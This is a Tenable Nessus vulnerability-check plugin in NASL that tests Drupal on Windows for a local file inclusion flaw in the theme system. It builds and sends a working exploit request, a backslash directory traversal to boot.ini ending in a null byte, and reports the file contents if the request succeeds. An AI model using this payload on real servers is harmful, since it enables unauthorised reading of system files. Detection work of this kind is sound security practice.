#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(35751);
  script_version("$Revision: 1.3 $");

  script_bugtraq_id(33910);
  script_xref(name:"OSVDB", value:"52287");

  script_name(english:"Drupal Theme System Template Local File Inclusion");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP application that is susceptible \n",
      "to a local file include attack."
    )
  );
  script_set_attribute(
    attribute:"description",
    value:string(
      "The version of Drupal installed on the remote host fails to filter\n",
      "input to the 'template_file' argument of the 'theme_render_template'\n",
      "function before using it in 'includes/themes.inc' to include PHP code.\n",
      "When Drupal is running on a Windows host, an unauthenticated attacker\n",
      "can exploit this vulnerability to view local files or possibly execute\n",
      "arbitrary PHP scripts with the permissions of the web server process."
    )
  );
  script_set_attribute(
    attribute:"see_also",
    value:string(
      "http://www.nessus.org/u?fb0fb4bc"
    )
  );
  script_set_attribute(
    attribute:"see_also",
    value:string(
      "http://www.securityfocus.com/archive/1/501297/30/0/threaded"
    )
  );
  script_set_attribute(
    attribute:"see_also",
    value:string(
      "http://drupal.org/node/383724"
    )
  );
  script_set_attribute(
    attribute:"see_also",
    value:string(
      "http://drupal.org/node/384024"
    )
  );
  script_set_attribute(
    attribute:"solution",
    value:string(
      "Either apply the appropriate patch as described in the project's\n",
      "advisories above or upgrade to Drupal 6.10 / 5.16 or later."
    )
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:string(
      "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
    )
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("drupal_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www",80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


# Only test Windows if we know what the OS is.
os = get_kb_item("Host/OS");
if (os && "Windows" >!< os) exit(0);


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


file = '\\boot.ini';
traversal = crap(data:"..\", length:3*9) + '..';
file_pat = "^ *\[boot loader\]";


# Test an install
install = get_kb_item(string("www/", port, "/drupal"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  exploit = string(traversal, file, "%00");
  url = string(
    dir, "/?",
    "q=admin/help", string(traversal, file, "%00")
  );

  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(0);

  # There's a problem if we see the expected contents.
  if (egrep(pattern:file_pat, string:res[2]))
  {
    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to exploit the issue to retrieve the contents of \n",
        "'", file, "' on the remote host using the following URL :\n",
        "\n",
        " ", build_url(port:port, qs:url), "\n"
      );
      if(report_verbosity > 1)
      {
        report += string(
          "\n",
          "Here are its contents :\n",
          "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
          res[2],
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
        );
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
